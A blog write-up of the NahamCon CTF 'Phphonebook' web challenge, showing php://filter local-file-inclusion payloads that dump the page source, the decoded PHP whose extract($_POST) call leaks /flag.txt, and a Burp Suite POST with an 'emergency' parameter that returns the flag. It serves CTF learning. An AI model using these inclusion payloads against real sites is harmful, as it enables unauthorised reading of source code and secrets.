---
title: phphonebook
post_title: Phphonebook Writeup - NahamCon CTF
categories:
- blog
- writeups
- NahamConCTF
tags:
- ctf
- writeup
- nahamcon
- web
---

This is a writeup for Phphonebook web challenge from NahamCon CTF.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/{{ page.title}}01.png)

http://jh2i.com:50002


once we open the url of the challenge we will find the below page

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/{{ page.title}}02.png)

Which tells us that we are in  /index.php/?file=    

and The phonebook is located at phphonebook.php

if we go to jh2i.com:50002/phphonebook.php we will find nothing interesting.

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/{{ page.title}}03.png)

so lets go back and try to include phphonebook.php in the /index.php/ page

jh2i.com:50002/index.php/?file=phphonebook.php

it works! and phphonebook.php is included and interpreted in the /index.php page 

so lets go search for any technique to abuse the local file inclusion to get the source code of phphonebook.php file to see whats inside it

You will find more than one technique using php filters to retrieve the source code through local file inclusion

http://jh2i.com:50002/index.php/?file=php://filter/convert.base64-encode/resource=phphonebook.php


the above one will retrieve you the source code but its base64-encoded. You are free to go decode it and see what you can do with it.
 PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5QaHBob25lYm9vazwvdGl0bGU+CiAgICA8bGluayBocmVmPSJtYWluLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4KICA8L2hlYWQ+CgogIDxib2R5IGNsYXNzPSJiZyI+CiAgICA8aDEgaWQ9ImhlYWRlciI+IFdlbGNvbWUgdG8gdGhlIFBocGhvbmVib29rIDwvaDE+CgogICAgPGRpdiBpZD0iaW1fY29udGFpbmVyIj4KCiAgICAgIDxpbWcgc3JjPSJib29rLmpwZyIgd2lkdGg9IjUwJSIgaGVpZ2h0PSIzMCUiLz4KCiAgICAgIDxwIGNsYXNzPSJkZXNjIj4KICAgICAgVGhpcyBwaHBob25lYm9vayB3YXMgbWFkZSB0byBsb29rIHVwIGFsbCBzb3J0cyBvZiBudW1iZXJzISBIYXZlIGZ1bi4uLgogICAgICA8L3A+CgogICAgPC9kaXY+Cjxicj4KPGJyPgogICAgPGRpdj4KICAgICAgPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiMiPgogICAgICAgIDxsYWJlbCBpZD0iZm9ybV9sYWJlbCI+RW50ZXIgbnVtYmVyOiA8L2xhYmVsPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJudW1iZXIiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQiPgogICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCiAgICA8ZGl2IGlkPSJwaHBfY29udGFpbmVyIj4KICAgIDw/cGhwCiAgICAgIGV4dHJhY3QoJF9QT1NUKTsKCiAgICAJaWYgKGlzc2V0KCRlbWVyZ2VuY3kpKXsKICAgIAkJZWNobyhmaWxlX2dldF9jb250ZW50cygiL2ZsYWcudHh0IikpOwogICAgCX0KICAgID8+CiAgPC9kaXY+CiAgPC9icj4KICA8L2JyPgogIDwvYnI+CgoKPGRpdiBzdHlsZT0icG9zaXRpb246Zml4ZWQ7IGJvdHRvbToxJTsgbGVmdDoxJTsiPgo8YnI+PGJyPjxicj48YnI+CjxiPiBOT1QgQ0hBTExFTkdFIFJFTEFURUQ6PC9iPjxicj5USEFOSyBZT1UgdG8gSU5USUdSSVRJIGZvciBzdXBwb3J0aW5nIE5haGFtQ29uIGFuZCBOYWhhbUNvbiBDVEYhCjxwPgo8aW1nIHdpZHRoPTYwMHB4IHNyYz0iaHR0cHM6Ly9kMjR3dXE2bzk1MWkyZy5jbG91ZGZyb250Lm5ldC9pbWcvZXZlbnRzL2lkLzQ1Ny80NTc3NDgxMjEvYXNzZXRzL2Y3ZGEwZDcxOGViNzdjODNmNWNiNjIyMWEwNmEyZjQ1LmludGkucG5nIj4KPC9wPgo8L2Rpdj4KCiAgPC9ib2R5Pgo8L2h0bWw+

http://jh2i.com:50002/index.php/?file=php://filter/convert.iconv.utf-8.utf-16le/resource=phphonebook.php

and this one will retrieve the source code utf-16le (without BOM-Byte Order Mark) encoded

```html
 <!DOCTYPE html><html lang="en">  <head>    <meta charset="utf-8">    <title>Phphonebook</title>    <link href="main.css" rel="stylesheet">  </head>  <body class="bg">    <h1 id="header"> Welcome to the Phphonebook </h1>    <div id="im_container">      <img src="book.jpg" width="50%" height="30%"/>      <p class="desc">      This phphonebook was made to look up all sorts of numbers! Have fun...      </p>    </div><br><br>    <div>      <form method="POST" action="#">        <label id="form_label">Enter number: </label>        <input type="text" name="number">        <input type="submit" value="Submit">      </form>    </div>    <div id="php_container">    <?php      extract($_POST);     if (isset($emergency)){      echo(file_get_contents("/flag.txt"));     }    ?>  </div>  </br>  </br>  </br><div style="position:fixed; bottom:1%; left:1%;"><br><br><br><br><b> NOT CHALLENGE RELATED:</b><br>THANK YOU to INTIGRITI for supporting NahamCon and NahamCon CTF!<p><img width=600px src="https://d24wuq6o951i2g.cloudfront.net/img/events/id/457/457748121/assets/f7da0d718eb77c83f5cb6221a06a2f45.inti.png"></p></div>  </body></html>
```

copy the source code 
go to https://beautifier.io/
select Beautify HTML 
paste the code
click on Beautify code

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/{{ page.title}}04.png)


once it has been beautified, you can see the php line of code 
which extracts a POST request parameters and check if a parameter called emergency is exist or not 
if it exist then it will echo the contents of the flag.txt file

so lets craft a POST request with the “emergency” parameter included and see what happens

To manipulate and send custom requests we have two options, the web browser or we can use Burpsuite

lets open burpsuite to intercept and manipulate/Craft the requests to the web server 

just to be familiar with Burpsuite and see how to use it to send custom requests

open the browser then enable Burpsuite proxy settings. here I'm using FoxyProxy firefox extension with burpsuite settings configured

then open http://jh2i.com:50002/phphonebook.php 


![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/{{ page.title}}05.png)

Go back to Burpsuite, open Proxy tab then you will see that the request to the web server has been intercepted by Burpsuite

which is a GET not POST request
What we want to do it to send a POST request with the emergency parameter included


![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/{{ page.title}}06.png)


so click anywhere on the request then choose Send to repeater or simply just click ctrl+r

Go to Repeater tab 

On the request Raw tab text box, change the GET method to POST

then add the emergency POST parameter to the body of the request. 

An additional tab called Params will be automatically shown which includes all the parameters of the request. which in our case is just “emergency”

you can pre-set a keyword to search for after the response is received 

the response is received with the flag 

`flag{phon3_numb3r_3xtr4ct3d}`

![image](/assets/images/writeups/nahamcon-ctf/{{ page.title}}/{{ page.title}}07.png)
